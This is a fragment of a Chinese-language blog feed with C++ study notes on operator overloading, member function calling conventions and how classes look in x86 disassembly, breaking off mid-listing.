        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>重载不陌生</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ++a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数重载就是一种。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>运算符重载就是利用常见的运算符<code>+-*/</code>去做一些重载的事情。</p><p>比如string就可以实现+&#x3D;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;hello &quot;</span>;</span><br><span class="line">str += <span class="string">&quot;world&quot;</span>;</span><br></pre></td></tr></table></figure><img src="/2022/06/25/operator/000.png" class=""><p>默认的+肯定是只能对数值类型进行数学运算，而string这种重新设计的+就是运算符重载</p><p>语法：<code>返回值类型 operator运算符();</code></p><p>自定义一个类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> height;</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">int</span> h):height&#123;h&#125; &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在正常情况下，比较两个实例化对象的height属性</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Box <span class="title">b1</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line"><span class="function">Box <span class="title">b2</span><span class="params">(<span class="number">150</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(b1 &lt; b2)&#123;</span><br><span class="line">    ...         <span class="comment">//肯定是不行的，因为类和类之间不支持用&lt;&gt;比大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照常规逻辑，就是写一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">toBig</span><span class="params">(Box &amp;ba, Box &amp;bb)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ba.height &lt; bb.height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后if在去判断这个返回值。</p><hr><h2 id="非成员函数运算符重载"><a href="#非成员函数运算符重载" class="headerlink" title="非成员函数运算符重载"></a>非成员函数运算符重载</h2><p>那么如果有了运算符重载。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;(Box &amp;ba, Box &amp;bb)&#123;</span><br><span class="line"><span class="keyword">return</span> ba.height &lt; bb.height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，这样在形式上看着可能跟函数换汤不换药的感觉。</p><p>在实际用的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (b1 &lt; b2) std::cout &lt;&lt; <span class="string">&quot;b2 big&quot;</span> &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/06/25/operator/001.png" class=""><p>本质上是<code>if (operator&lt;(b1, b2)) std::cout &lt;&lt; &quot;b2 big&quot; &lt;&lt; std::endl;</code><br>既然是运算符重载，自然会转换成上面那种形式，因为有了模板，他就知道放两个类的时候，用什么比较。</p><blockquote><p>如果变量是私有的，普通情况不具备访问权限，就可能要用friend友元操作，但是不是特别好</p></blockquote><p>既然是模板，除了类和类，也可以用其他类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;(Box &amp;ba, <span class="type">int</span> x)&#123;</span><br><span class="line"><span class="keyword">return</span> ba.height &lt; x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只不过像short float double那些还要额外重载。</p><hr><h2 id="成员函数运算符重载"><a href="#成员函数运算符重载" class="headerlink" title="成员函数运算符重载"></a>成员函数运算符重载</h2><p>上述的非成员就是不定义在类中，定义在类中的也好写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> height;</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">int</span> h):height&#123;h&#125; &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;(Box &amp;ba)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;height &lt; ba.height;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/25/operator/002.png" class=""><p>可以看到这个运算符重载是写在类中的。是属于类的成员。</p><p>与上述的本质也有差异<code>if (b1.operator&lt;(b2)) std::cout &lt;&lt; &quot;b2 big&quot; &lt;&lt; std::endl;</code></p><p><strong>因为运算符重载通过函数模式发生，所以谁调用的就跟谁连在一起</strong></p><hr><h2 id="为什么会有重载运算符"><a href="#为什么会有重载运算符" class="headerlink" title="为什么会有重载运算符"></a>为什么会有重载运算符</h2><ol><li>最主要就是让类也支持原生的运算</li><li>提示对程序的控制权，比如重载new delete new[] delete[]</li></ol><p><strong>但是注意，运算符的重载只是为了让代码更方便使用和维护，并不能提升什么开发效率</strong></p><hr><h2 id="运算符重载的限制"><a href="#运算符重载的限制" class="headerlink" title="运算符重载的限制"></a>运算符重载的限制</h2><ol><li>只能通过现有运算符，不能自定义</li><li>有些运算符不能重载<ol><li>对象访问<code>.</code>，比如user.hp</li><li>作用域解析<code>::</code>，std::cout</li><li>求大小运算符sizeof</li><li>三目运算<code>?:</code></li></ol></li><li>无法修改运算符本身优先级</li><li>在c++17之后，也不能修改运算符的操作数计算顺序，17之前 编译器可以自由选择，但是仍然是一种未定义行为</li><li>除了delete&#x2F;delete[]和new&#x2F;new[]外，不能对原生数据类型的其他运算符重载，比如char的+定义为-</li><li>除了new和delete以外，其他运算符的操作数的个数一律不能修改</li></ol><p><strong>不建议重载逻辑运算符，因为逻辑运算符重载之后将不会进行短路测试</strong><br><strong>c++17后计算的顺序规定为先计算左边在计算右边</strong></p><hr><h2 id="运算符重载的正确姿势"><a href="#运算符重载的正确姿势" class="headerlink" title="运算符重载的正确姿势"></a>运算符重载的正确姿势</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 二元运算符重载</span></span><br><span class="line">全局函数 - 返回类型 <span class="keyword">operator</span> 运算符(类型 左操作数，类型 右操作数)</span><br><span class="line">类的成员函数 - 返回类型 <span class="keyword">operator</span> 运算符(类型 右操作数)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一元运算符重载</span></span><br><span class="line">全局函数 - 返回类型 <span class="keyword">operator</span> 运算符(类型 操作数)</span><br><span class="line">类的成员函数 - 返回类型 <span class="keyword">operator</span> 运算符()</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>运算符的重载借用关键字operator + 运算符符号，本质上还是跟函数差不多，只不过标准化之后优化了用起来比普通函数好很多。</p><p>然后重载的时候注意下合法问题，不要擅自做一些感觉牛皮的行为。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义类的函数调用约定</title>
      <link href="/2022/06/25/CustonCallFunction/"/>
      <url>/2022/06/25/CustonCallFunction/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基础的类，默认调用成员函数使用的调用约定是<code>_thiscall</code>。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先随便写一段代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">x += a;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box b1;</span><br><span class="line">b1.<span class="built_in">Add</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后反汇编看调用Add的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Box b1;</span><br><span class="line">b1.<span class="built_in">Add</span>(<span class="number">10</span>);</span><br><span class="line"><span class="number">002119</span>AF <span class="number">6</span>A <span class="number">0</span>A                push        <span class="number">0</span>Ah  </span><br><span class="line"><span class="number">002119B</span>1 <span class="number">8</span>D <span class="number">4</span>D F4             lea         ecx,[b1]  </span><br><span class="line"><span class="number">002119B</span>4 E8 <span class="number">8</span><span class="function">C F7 FF FF       call        <span class="title">Box::Add</span> <span class="params">(<span class="number">0211145</span>h)</span> </span></span><br></pre></td></tr></table></figure><p>像这种调用ecx寄存器存放实例化对象的指针的调用约定就是<code>_thiscall</code></p><p>但是别人写的不一定就按照这个调用约定，之前学过的几种函数调用约定方式就可以套。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">x += a;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> _stdcall <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">x += a + b;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box b1;</span><br><span class="line">b1.<span class="built_in">Add</span>(<span class="number">100</span>, <span class="number">200</span>);</span><br><span class="line"><span class="number">000619</span>AF <span class="number">68</span> C8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push        <span class="number">0</span>C8h  </span><br><span class="line"><span class="number">000619B</span>4 <span class="number">6</span>A <span class="number">64</span>                push        <span class="number">64</span>h  </span><br><span class="line"><span class="number">000619B</span>6 <span class="number">8</span>D <span class="number">45</span> F4             lea         eax,[b1]  </span><br><span class="line"><span class="number">000619B</span>9 <span class="number">50</span>                   push        eax  </span><br><span class="line"><span class="number">000619B</span>A E8 <span class="number">0B</span> <span class="function">FA FF FF       call        <span class="title">Box::Add</span> <span class="params">(<span class="number">0613</span>CAh)</span> </span></span><br></pre></td></tr></table></figure><p>参数入栈而言，都是从右往左</p><p>不过这种调用约定就不用ecx了，而是把b1的地址传给eax，再把eax当初参数压入栈中。</p><p>还有就是<code>_stdcall</code>的堆栈平衡是由函数自己恢复<br>也就是函数结尾的时候ret 有一个值</p><img src="/2022/06/25/CustonCallFunction/000.png" class=""><p><strong>另外还有几种函数调用也可以试下</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>提一嘴，后面解读别的程序的时候不会显得太懵逼。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>换个角度看类</title>
      <link href="/2022/06/25/inclass/"/>
      <url>/2022/06/25/inclass/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>逆向水的一批，顶多反汇编看看有啥过程</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>x64虽然快点，但是老的还是从x86开始</p><hr><h2 id="类的函数调用约定this"><a href="#类的函数调用约定this" class="headerlink" title="类的函数调用约定this"></a>类的函数调用约定this</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> hp + a + b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">Box b1;</span><br><span class="line">b1.<span class="built_in">Add</span>(<span class="number">100</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>模式切换成release，选择x86</li><li>关闭优化</li><li>禁用安全检查</li></ol><img src="/2022/06/25/inclass/000.png" class=""><img src="/2022/06/25/inclass/001.png" class=""><p>安全检查会增加不少的汇编代码，不利于常规分析。</p><p>然后随便打断点反汇编查看</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">003</span>A1020 <span class="number">55</span>                   push        ebp  </span><br><span class="line"><span class="number">003</span>A1021 <span class="number">8B</span> EC                mov         ebp,esp  </span><br><span class="line"><span class="number">003</span>A1023 <span class="number">51</span>                   push        ecx  </span><br><span class="line"></span><br><span class="line">Box b1;</span><br><span class="line">b1.<span class="built_in">Add</span>(<span class="number">100</span>, <span class="number">200</span>);</span><br><span class="line"><span class="number">003</span>A1024 <span class="number">68</span> C8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push        <span class="number">0</span>C8h  </span><br><span class="line"><span class="number">003</span>A1029 <span class="number">6</span>A <span class="number">64</span>                push        <span class="number">64</span>h  </span><br><span class="line"><span class="number">003</span>A102B <span class="number">8</span>D <span class="number">4</span>D FC             lea         ecx,[ebp<span class="number">-4</span>]  </span><br><span class="line"><span class="number">003</span>A102E E8 CD FF FF FF       call        <span class="number">003</span>A1000  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">003</span>A1033 <span class="number">33</span> C0                <span class="keyword">xor</span>         eax,eax  </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">003</span>A1035 <span class="number">8B</span> E5                mov         esp,ebp  </span><br><span class="line"><span class="number">003</span>A1037 <span class="number">5</span>D                   pop         ebp  </span><br><span class="line"><span class="number">003</span>A1038 C3                   ret  </span><br></pre></td></tr></table></figure><p>可以看到精简了很多。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="number">003</span>A1002 EC                   in          al,dx  </span><br><span class="line"><span class="number">003</span>A1003 <span class="number">51</span>                   push        ecx  </span><br><span class="line"><span class="number">003</span>A1004 <span class="number">89</span> <span class="number">4</span>D FC             mov         dword ptr [ebp<span class="number">-4</span>],ecx  </span><br><span class="line"><span class="keyword">return</span> hp + a + b;</span><br><span class="line"><span class="number">003</span>A1007 <span class="number">8B</span> <span class="number">45</span> FC             mov         eax,dword ptr [ebp<span class="number">-4</span>]  </span><br><span class="line"><span class="number">003</span>A100A <span class="number">8B</span> <span class="number">00</span>                mov         eax,dword ptr [eax]  </span><br><span class="line"><span class="number">003</span>A100C <span class="number">03</span> <span class="number">45</span> <span class="number">08</span>             add         eax,dword ptr [ebp+<span class="number">8</span>]  </span><br><span class="line"><span class="number">003</span>A100F <span class="number">03</span> <span class="number">45</span> <span class="number">0</span>C             add         eax,dword ptr [ebp+<span class="number">0</span>Ch]  </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">003</span>A1012 <span class="number">8B</span> E5                mov         esp,ebp  </span><br><span class="line"><span class="number">003</span>A1014 <span class="number">5</span>D                   pop         ebp  </span><br><span class="line"><span class="number">003</span>A1015 C2 <span class="number">08</span> <span class="number">00</span>             ret         <span class="number">8</span> </span><br></pre></td></tr></table></figure><blockquote><p>至于显示符号名这个可开可不开，都是便于理解的东西</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Box b1;</span><br><span class="line">b1.<span class="built_in">Add</span>(<span class="number">100</span>, <span class="number">200</span>);</span><br><span class="line"><span class="number">003</span>A1024 <span class="number">68</span> C8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push        <span class="number">0</span>C8h  </span><br><span class="line"><span class="number">003</span>A1029 <span class="number">6</span>A <span class="number">64</span>                push        <span class="number">64</span>h  </span><br><span class="line"><span class="number">003</span>A102B <span class="number">8</span>D <span class="number">4</span>D FC             lea         ecx,[ebp<span class="number">-4</span>]  </span><br><span class="line"><span class="number">003</span>A102E E8 CD FF FF FF       call        <span class="number">003</span>A1000 </span><br></pre></td></tr></table></figure><p>调用b1.Add的时候也是从右至左把参数压入栈中。<br>lea指令就是把地址传给寄存器，那么这里ebp-4自然就是实例化对象b1的内存地址。<br>call 003a1000 就是调用函数，这里也就调用了.Add函数。</p><img src="/2022/06/25/inclass/002.png" class=""><p>直接将地址copy进来，跳转，自然就是Box::Add的位置了。</p><p>反汇编里，看起来成员函数的调用传参都和正常函数没差。<br>因为要看<code>this</code>所以把符号名打开了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="number">003</span>A1000 <span class="number">55</span>                   push        ebp  </span><br><span class="line"><span class="number">003</span>A1001 <span class="number">8B</span> EC                mov         ebp,esp  </span><br><span class="line"><span class="number">003</span>A1003 <span class="number">51</span>                   push        ecx  </span><br><span class="line"><span class="number">003</span>A1004 <span class="number">89</span> <span class="number">4</span>D FC             mov         dword ptr [<span class="keyword">this</span>],ecx  </span><br><span class="line"><span class="keyword">return</span> hp + a + b;</span><br><span class="line"><span class="number">003</span>A1007 <span class="number">8B</span> <span class="number">45</span> FC             mov         eax,dword ptr [<span class="keyword">this</span>]  </span><br><span class="line"><span class="number">003</span>A100A <span class="number">8B</span> <span class="number">00</span>                mov         eax,dword ptr [eax]  </span><br><span class="line"><span class="number">003</span>A100C <span class="number">03</span> <span class="number">45</span> <span class="number">08</span>             add         eax,dword ptr [a]  </span><br><span class="line"><span class="number">003</span>A100F <span class="number">03</span> <span class="number">45</span> <span class="number">0</span>C             add         eax,dword ptr [b]  </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">003</span>A1012 <span class="number">8B</span> E5                mov         esp,ebp  </span><br><span class="line"><span class="number">003</span>A1014 <span class="number">5</span>D                   pop         ebp  </span><br><span class="line"><span class="number">003</span>A1015 C2 <span class="number">08</span> <span class="number">00</span>             ret         <span class="number">8</span></span><br></pre></td></tr></table></figure><p>函数入栈ebp跟随上来，然后esp跟ebp持平保持栈平衡<br>然后调用了一个ecx寄存器，又将ecx的值传给this指针，其实就是ebp-4 实例化 b1的地址，它的内存上也就一个hp。<br>然后将this指针的值传给eax寄存器，后面这个把eax的值又赋给eax其实有点迷惑操作。<br>可能先前是为了获取这个对象的地址，然后再取出hp的值，如果多个成员估计就能看出区别了。<br>按照这种道理，其实就是this-&gt;hp+a+b。先通过实例化对象，再去找它需要的成员。</p><p>后面的两个add就没啥问题，就是hp+a+b顺序执行。</p><blockquote><p>不过按照这个反汇编，倒是看到，在类中调用自身成员其实都是通过this-&gt;获取<br>即使代码上不加，反汇编的时候还是遵循这个过程。<br>所以之前加上倒是便于理解了。</p></blockquote><hr><h3 id="thiscall"><a href="#thiscall" class="headerlink" title="_thiscall"></a>_thiscall</h3><p>_thiscall是c++类中的成员函数访问时定义的函数调用约定</p><ol><li>寄存器ecx用来存放类的指针</li><li>参数依旧是从右往左入栈</li><li>堆栈平衡由被调用者负责恢复</li></ol><p>类中的非静态成员函数都可以调用this指针，this指针本身就是实例化对象的地址通过ecx传给成员函数。<br>所以当类中成员函数访问其成员变量的时候，都是指针+偏移的形式访问。<br>而且不管你是否明确使用this-&gt;，编译器默认都是按照这个逻辑。</p><blockquote><p>不过如果这个ecx被人逮到了，那里面的东西其实都可以通过便宜访问到了。</p></blockquote><hr><h2 id="静态成员函数没有this指针"><a href="#静态成员函数没有this指针" class="headerlink" title="静态成员函数没有this指针"></a>静态成员函数没有this指针</h2><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="_cdecl"></a>_cdecl</h3><p>类的静态成员函数调用约定_cdecl</p><ol><li>参数从右往左入栈</li><li>由调用者恢复堆栈平衡 – 就是这个函数结束的时候会add esp,8 当然数值不固定由内存决定</li></ol><p>前面也说了，静态成员函数本质上就是一个普通的函数，他不会随着对象实例化而传递。<br>因此他也不会有this指针这种东西，没有了this指针也就注定它不能访问类中的成员变量<br>而静态成员变量能访问是因为静态变量本质上也是一个全局的变量，内存地址固定，与类实例化后互不影响。<br>所以静态成员可以通过作用域方式访问到：<code>类::静态成员变量</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> hp + a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">test</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">Box b1;</span><br><span class="line"><span class="comment">//b1.Add(100, 200);</span></span><br><span class="line"></span><br><span class="line">b1.<span class="built_in">test</span>(<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">00</span>EA1010 <span class="number">55</span>                   push        ebp  </span><br><span class="line"><span class="number">00</span>EA1011 <span class="number">8B</span> EC                mov         ebp,esp  </span><br><span class="line"></span><br><span class="line">Box b1;</span><br><span class="line"><span class="comment">//b1.Add(100, 200);</span></span><br><span class="line"></span><br><span class="line">b1.<span class="built_in">test</span>(<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line"><span class="number">00</span>EA1013 <span class="number">68</span> C8 <span class="number">00</span> <span 